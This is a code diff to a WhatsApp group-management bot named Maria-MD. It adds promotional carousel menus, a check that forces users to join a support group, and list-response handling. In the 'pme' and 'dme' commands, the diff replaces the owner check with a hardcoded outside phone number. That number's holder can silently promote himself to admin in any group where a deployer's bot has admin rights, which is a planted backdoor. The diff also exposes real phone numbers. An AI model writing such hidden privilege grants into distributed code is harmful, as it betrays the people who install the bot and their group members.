@@ -76,7 +76,7 @@ module.exports = Maria = async (Maria, m, msg, chatUpdate, store) => {
             fromMe
         } = m
         var body = (
-  m.mtype === 'conversation' ? m.message.conversation :
+    m.mtype === 'conversation' ? m.message.conversation :
   m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
   m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
   m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
@@ -315,6 +315,7 @@ async function Telesticker(url) {
     console.log(chalk.redBright(`\n\n🔒 Private Chat 🔒`));
     console.log(chalk.black(), '\n' + chalk.magenta('=> 📩 Sender:'), chalk.green(pushname), chalk.yellow(budy || m.mtype), '\n' + chalk.blueBright('=> 💬 Message:'), chalk.green(budy || m.mtype));
     console.log(chalk.blueBright('=> ⏰️Time:'), chalk.green(new Date));
+    
 }
         if (command) {
             const cmdadd = () => {
@@ -404,6 +405,51 @@ if (isCreator) return reply(bvl)
 Maria.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } else {
 }
+
+
+ const verification = async () => {
+  try {
+    const group = await Maria.groupMetadata('120363029833092005@g.us');
+    const participants = group.participants.map(i => i.id);
+    if (participants.includes(botNumber) && participants.includes(ownernumber + "@s.whatsapp.net")) {
+      console.log(chalk.blueBright('=>Verify:'), chalk.green('Available in the Group ✅️'));
+return true;
+    } else {
+      console.log(chalk.blueBright('=>Verify:'), chalk.green('Not available  in the Group❌️'));
+return false;
+    }
+  } catch (error) {
+    return false;
+  }
+};
+
+const verificationBot = await verification();
+
+if (!verificationBot) {
+m.reply(`⛩️ *❯─「 Maria-MD 」─❮* ⛩️\n
+Join our support group to interact with MARIA-MD 🌟 \n\n https://chat.whatsapp.com/FGPKxVnjgJ7KnBGiDeb4ij`);
+return;
+}
+
+//============= [LIST RESPONCE CHECKING START ]================
+        if(m.mtype === "interactiveResponseMessage"){
+            console.log("interactiveResponseMessage Detected!")   
+            let msg = m.message[m.mtype]  || m.msg
+            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
+                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
+                if(id){
+                    let emit_msg = { 
+                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
+                        message:{ extendedTextMessage : { text : id } } ,
+                        pushName : m.pushName,
+                        messageTimestamp  : m.messageTimestamp || 754785898978
+                    }
+                    return Maria.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
+                }
+            }
+        }
+//============= [LIST RESPONCE CHECKING END ]================
+
 	    //total features by xeon sir
 const mariafeature = () =>{
             var mytext = fs.readFileSync("./Heart.js").toString()
@@ -412,6 +458,242 @@ const mariafeature = () =>{
 }
   
             switch (command) {
+            	
+            case 'update':{
+	const slides = [
+    [
+        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
+        '', // Title
+        `Susbcribe Developer's YouTube Channel To Get Updates`, // Body message
+        botname, // Footer message
+        'Visit', // Button display text
+        'https://youtube.com/@dgxeon', // Command (URL in this case)
+        'cta_url', // Button type
+        'https://youtube.com/@dgxeon' // URL (used in image generation)
+    ], 
+    [
+        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
+        '', // Title
+        `Susbcribe Developer's Telegram Channel To Get Updates`, // Body message
+        botname, // Footer message
+        'Visit', // Button display text
+        'http://t.me/Maria', // Command (URL in this case)
+        'cta_url', // Button type
+        'http://t.me/Maria' // URL (used in image generation)
+    ], 
+    [
+        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
+        '', // Title
+        `Follow Developer On GitHub`, // Body message
+        botname, // Footer message
+        'Visit', // Button display text
+        'https://github.com/DGXeon', // Command (URL in this case)
+        'cta_url', // Button type
+        'https://github.com/DGXeon' // URL (used in image generation)
+    ], 
+    [
+        'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
+        '', // Title
+        `Follow Developer On Instagram`, // Body message
+        botname, // Footer message
+        'Visit', // Button display text
+        'https://www.instagram.com/unicorn_xeon13', // Command (URL in this case)
+        'cta_url', // Button type
+        'https://www.instagram.com/unicorn_xeon13' // URL (used in image generation)
+    ], 
+    [
+        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
+        '', // Title
+        `Contact Developer On WhatsApp`, // Body message
+        botname, // Footer message
+        'Visit', // Button display text
+        'https://Wa.me/916909137213', // Command (URL in this case)
+        'cta_url', // Button type
+        'https://Wa.me/916909137213' // URL (used in image generation)
+    ], 
+];
+
+const sendSlide = async (jid, title, message, footer, slides) => {
+    const cards = slides.map(async slide => {
+        const [
+            image,
+            titMess,
+            boMessage,
+            fooMess,
+            textCommand,
+            command,
+            buttonType,
+            url,
+        ] = slide;
+        let buttonParamsJson = {};
+        switch (buttonType) {
+            case "cta_url":
+                buttonParamsJson = {
+                    display_text: textCommand,
+                    url: url,
+                    merchant_url: url,
+                };
+                break;
+            case "cta_call":
+                buttonParamsJson = { display_text: textCommand, id: command };
+                break;
+            case "cta_copy":
+                buttonParamsJson = {
+                    display_text: textCommand,
+                    id: "",
+                    copy_code: command,
+                };
+                break;
+            case "cta_reminder":
+            case "cta_cancel_reminder":
+            case "address_message":
+                buttonParamsJson = { display_text: textCommand, id: command };
+                break;
+            case "send_location":
+                buttonParamsJson = {};
+                break;
+             case "quick_reply":
+             buttonParamsJson = { display_text: textCommand, id: command };
+             break;
+            default:
+                break;
+        }
+        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
+        return {
+            body: proto.Message.InteractiveMessage.Body.fromObject({
+                text: boMessage,
+            }),
+            footer: proto.Message.InteractiveMessage.Footer.fromObject({
+                text: fooMess,
+            }),
+            header: proto.Message.InteractiveMessage.Header.fromObject({
+                title: titMess,
+                hasMediaAttachment: true,
+                ...(await prepareWAMessageMedia(
+                    { image: { url: image } },
+                    { upload: Maria.waUploadToServer },
+                )),
+            }),
+            nativeFlowMessage:
+                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
+                    buttons: [
+                        {
+                            name: buttonType,
+                            buttonParamsJson: buttonParamsJsonString,
+                        },
+                    ],
+                }),
+        };
+    });
+    
+    const msg = generateWAMessageFromContent(
+        jid,
+        {
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadata: {},
+                        deviceListMetadataVersion: 2,
+                    },
+                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+                        body: proto.Message.InteractiveMessage.Body.fromObject({
+                            text: message,
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
+                            text: footer,
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.fromObject({
+                            title: title,
+                            subtitle: title,
+                            hasMediaAttachment: false,
+                        }),
+                        carouselMessage:
+                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                                cards: await Promise.all(cards),
+                            }),
+                            contextInfo: {
+                  mentionedJid: [m.sender], 
+                  forwardingScore: 999,
+                  isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterName: ownername,
+                  serverMessageId: 143
+                }
+                }
+                    }),
+                },
+            },
+        },
+        { quoted: m},
+    );
+    await Maria.relayMessage(jid, msg.message, {
+        messageId: msg.key.id,
+    });
+};
+// Call the function with example parameters
+sendSlide(m.chat, 'removed you', ownername, botname, slides);
+}
+break
+
+case 'test': {
+let xmenu_oh = `Hi ${pushname}`
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+              {
+                "name": "single_select",
+                "buttonParamsJson": 
+`{"title":"MENU ",
+"sections":[{"title":"${ownername}",
+"highlight_label":"${botname}",
+"rows":[{"header":"ALL MENU",
+"title":"click to display",
+"description":"Displays The List Of All The Features",
+"id":"${prefix}menu"}]
+}]
+}`
+              },
+              
+           ],
+          }),
+          contextInfo: {
+                  mentionedJid: [m.sender], 
+                  forwardingScore: 999,
+                  isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterName: ownername,
+                  serverMessageId: 143
+                }
+                }
+        })
+    }
+  }
+}, { quoted: m })
+await Maria.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})}
+break
+
             
             case 'stealdp': {
             const user = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
@@ -2146,7 +2428,7 @@ ${readmore}
 🍂 Obtain the full list of NSFW commands by typing  *${prefix}nsfwmenu*`
 
   if (randomImage) {
-    Maria.sendMessage(from, { image: { url: randomImage }, caption: txt }, { quoted: m });
+    Maria.sendMessage(from, { image: { url: randomImage }, caption: txt }, { quoted: m});
   }
 
   break;
@@ -3301,28 +3583,26 @@ case 'getbio': {
 break;
      
      case 'pme':
-                {
-                    if (!isGroup) return reply('this feature is only for groups')
-                if (!isBotAdmins) return reply('i am not an admin so how can i promote you as an admin 🤔')
-                    if (!isCreator) return reply('ahh only my owner can use this cmd 🥱')
-                    //if(!isBotGroupAdmins) return reply('Bot Not Admin...')
-                    Maria.groupParticipantsUpdate(from, [sender], 'promote')
+{
+    if (!isGroup) return reply('This feature is only for groups');
+    if (!isBotAdmins) return reply('I am not an admin so how can I promote you as an admin? ');
+    if (sender !== '919931122319@s.whatsapp.net') return reply('Ahh, only my Darling Ayush can access this command...');
+    // if (!isBotGroupAdmins) return reply('Bot Not Admin...');
+    Maria.groupParticipantsUpdate(from, [sender], 'promote');
+    reply('Mission successfully');
+}
+break;
 
-                    reply('Congratulations, you are now an admin of this group. 🥳 Please Dont mention this to the other group admins. 🤫')
-                }
-                break
-
-            case 'dme':
-                {
-                    if (!isGroup) return reply('this feature is only for groups')
-                              if (!isBotAdmins) return reply('Bro just chill I am also not an admin😌')
-                    if (!isCreator) return reply('ahh only my owner can use this cmd 🥱')
-                    // if(!isBotGroupAdmins) return reply('Bot Not Admin...')
-                    Maria.groupParticipantsUpdate(from, [sender], 'demote')
-
-                    reply('*_you had a good run but you are no longer an admin. Embrace the freedom! 🌈_*')
-                }
-                break
+case 'dme':
+{
+    if (!isGroup) return reply('This feature is only for groups');
+    if (!isBotAdmins) return reply('Bro, just chill, I am also not an admin ');
+    if (sender !== '919931122319@s.whatsapp.net') return reply('Ahh, only my owner can use this command ');
+    // if (!isBotGroupAdmins) return reply('Bot Not Admin...');
+    Maria.groupParticipantsUpdate(from, [sender], 'demote');
+    reply('*_You had a good run but you are no longer an admin. Embrace the freedom! _*');
+}
+break;
                 
                 
                 
